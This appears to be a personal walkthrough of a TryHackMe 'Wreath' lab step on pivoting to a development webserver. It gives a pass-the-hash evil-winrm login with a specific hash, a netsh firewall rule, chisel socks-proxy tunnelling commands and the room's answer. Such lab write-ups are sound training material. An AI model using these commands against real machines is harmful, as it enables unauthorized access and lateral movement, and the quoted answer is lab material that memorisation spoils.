We found two ports open in the previous task. RDP won't be of much use to us without credentials (or at least a hash, although Pass-the-Hash attacks are often restricted through RDP anyway); however, the webserver is worth looking into. Wreath told us that he worked on his website using a local environment on his own PC, so this bleeding-edge version may contain some vulnerabilities that we could use to exploit the target. Before we can do that, however, we must figure out how to access the development webserver on Wreath's PC from our attacking machine.

We have two immediate options for this: *Chisel*, and *Plink*.

If you followed the recommended route of using sshuttle to pivot from the webserver then a _chisel forward proxy_ is recommended here as it will be relatively easy to connect to through the sshuttle connection without requiring a relay -- look back at the Chisel task if you need help with this!

When using this option you will need to open up a port in the Windows firewall to allow the forward connection to be made. The syntax for opening a port using `netsh` looks something like this:  
`netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT`

Please use the `name-USERNAME` naming convention -- for example:  
`netsh advfirewall firewall add rule name="Chisel-MuirlandOracle" dir=in action=allow protocol=tcp localport=47000`  
![Demonstration of the above firewall rule through WinRM](https://assets.tryhackme.com/additional/wreath-network/31589c0e89b3.png)

Whether you choose the recommended option or not, get a pivot up and running!


![[AccesS to PC.svg]]

---

# Your job

 #Attacking_Machine 
1. For pivoting, we can use chisel. Run evil-winrm .
```
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.84.150 -s /home/kali/Tryhackme/Wreath/Chisel_1.7.7
```

2. Open up a port for pivoting. 
#Evil-WinRM_shell 
```
netsh advfirewall firewall add rule name="Chisel-exec2" dir=in action=allow protocol=tcp localport=18456
```
> [!Note]
>If you can't connect to the webpage, change the localport.

#Attacking_Machine 
3. Download   [chisel_1.7.7_windows_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz)  and [chisel_1.7.7_linux_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz) 

4. Decompress the .gz file. #Attacking_Machine 

5. Upload the chisel.exe file.
#Evil-WinRM_shell 
```
upload chisel.exe
```

6. Setup chisel server forward socks proxy on 
#Evil-WinRM_shell 
```
./chisel.exe server -p 18456 --socks5
```

7. Install chisel on Kali Linux. #Attacking_Machine 
	- Download `chisel_1.10.1_linux_amd64.deb` and decompress it.
	- Copy `chisel` file to `/usr/bin`.

![[Screenshot from 2025-02-21 11-51-44.png]]

8. Run chisel client. 
#Attacking_Machine 
```
chisel client 10.200.84.150:18456 9090:socks
```

![[Screenshot from 2025-02-21 11-50-16.png]]

Now the socks proxy is opened on port 9090 of our port.

9. Setup FoxyProxy: Ensure you setup a `SOCKS5` proxy with *foxyproxy*:
	 ![[Pivoting-20250126190740769.webp]]

10. Navigate to http://10.200.X.100.
	 ![[Pivoting-20250126190906256.webp]]

9. Install wappalyzer extension on your browers and see the results.
	![[Pivoting-20250126191308575.webp]]

Access the website in your web browser (using FoxyProxy if you used the recommended forward proxy, or directly if you used a port forward).

> [!Question]
>Using the Wappalyzer browser extension ([Firefox](https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/) | [Chrome](https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en)) or an alternative method, identify the server-side Programming language (including the version number) used on the website.
>`PHP 7.4.11`


**Next step: ** [[The Wonders of Git]]
